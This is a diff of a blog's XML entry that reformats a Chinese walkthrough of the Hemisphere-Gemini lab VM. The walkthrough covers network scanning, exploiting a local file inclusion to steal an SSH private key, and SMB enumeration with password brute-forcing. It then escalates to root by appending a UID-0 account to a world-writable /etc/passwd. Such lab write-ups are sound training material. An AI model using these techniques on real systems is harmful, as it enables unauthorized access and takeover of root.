@@ -645,30 +645,28 @@
   <entry>
     <title>靶机Hemisphere-Gemini渗透记录</title>
     <url>/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>准备<br>靶机Hemisphere-Gemini×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>如果网卡不一致还需要先改一下靶机网卡<br>靶机很简单很简单，放轻松~</p>
-<p>信息搜集<br>打开靶机</p>
-<p>老规矩，首先要确定靶机ip。先看mac地址是多少</p>
-<p>然后扫描确定ip<br>arp-scan -l</p>
-<p>确定ip之后用nmap进行更深层次的信息探测<br>nmap -sS -sV -A -Pn -n -p- 192.168.155.163</p>
-<p>80端口开着，可以先访问一下网页</p>
-<p>点了点没什么东西，那就在扫一下目录<br>gobuster dir -u  <a href="http://192.168.155.163/">http://192.168.155.163/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</p>
-<p>访问/Portal 又是一个页面，先点点</p>
-<p>渗透测试<br>（靶机有些简单，但也要把步骤明确好，勿喷勿喷）<br>第一种思路：<br>观察一下url<br>Sobre nosotros</p>
-<p>Contacto</p>
-<p>url后面的参数是view=文件 感觉可能是cat xxx<br>可能存在存在本地文件注入 (LFI)漏洞<br>手动测试了两下，果然！</p>
-<p>看到了一个名字叫wlliam的普通用户，尝试了一会，发现到了ssh备份文件</p>
-<p>好，上kali!<br>把id_rsa的内容保存在一个文件里，然后修改权限为600<br>这样就可以ssh链接了</p>
-<p>查看user.txt 获得第一个flag</p>
-<p>第二种思路：<br>之前nmap搜集到了smb服务的信息<br>接着信息搜集<br>enum4linux 192.168.155.163</p>
-<p>扫描后得到了一个名为william的账户<br>smb服务是开放的，我们还可以趁着这个机会去爆破密码</p>
-<p>（这是第二种思路，放在此处仅仅为了提供一种思路）</p>
-<p>提权<br>接下来就要提权了<br>find / -perm -u=s -type f 2&gt;/dev/null</p>
-<p>/etc/passwd倒是第一见，看一下权限</p>
-<p>所有用户都有读写执行权限，那我们可以生成一个用户密码写入/etc/passwd</p>
-<p>openssl passwd -1 -salt reigniting 123456</p>
-<p>echo ‘reigniting:$1$reigniti$xfzUaIQTdvQl8beISQhxk/:0:0:reigniting:/home/reigniting:/bin/bash’ &gt;&gt; /etc/passwd</p>
-<p>用户添加成功，接着su reigniting</p>
-<p>提权成功，获得第二flag<br>至此，渗透结束</p>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Hemisphere-Gemini×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>如果网卡不一致还需要先改一下靶机网卡<br>靶机很简单很简单，放轻松~</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，首先要确定靶机ip。先看mac地址是多少<br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.163</span><br></pre></td></tr></table></figure>
+<p> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>80端口开着，可以先访问一下网页<br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>点了点没什么东西，那就在扫一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u  http://192.168.155.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
+<p> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>访问/Portal 又是一个页面，先点点<br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>（靶机有些简单，但也要把步骤明确好，勿喷勿喷）<br>第一种思路：<br>观察一下url<br>Sobre nosotros<br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>Contacto<br> <img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>url后面的参数是view=文件 感觉可能是cat xxx<br>可能存在存在本地文件注入 (LFI)漏洞<br>手动测试了两下，果然！<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>看到了一个名字叫wlliam的普通用户，尝试了一会，发现到了ssh备份文件<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>好，上kali!<br>把id_rsa的内容保存在一个文件里，然后修改权限为600<br>这样就可以ssh链接了<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>查看user.txt 获得第一个flag<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
+<p>第二种思路：<br>之前nmap搜集到了smb服务的信息<br>接着信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.155.163</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>扫描后得到了一个名为william的账户<br>smb服务是开放的，我们还可以趁着这个机会去爆破密码<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>（这是第二种思路，放在此处仅仅为了提供一种思路）</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来就要提权了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>/etc/passwd倒是第一见，看一下权限<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>所有用户都有读写执行权限，那我们可以生成一个用户密码写入/etc/passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt reigniting 123456</span><br><span class="line"></span><br><span class="line">echo &#x27;reigniting:$1$reigniti$xfzUaIQTdvQl8beISQhxk/:0:0:reigniting:/home/reigniting:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>用户添加成功，接着<code>su reigniting</code><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>提权成功，获得第二flag<br>至此，渗透结束</p>
+<hr>
+<blockquote>
+<p>落去君休惜，飞来我自知。<br>莺愁蝶倦晚芳时，纵是明春再见隔年期。</p>
+</blockquote>
+<hr>
 ]]></content>
   </entry>
   <entry>
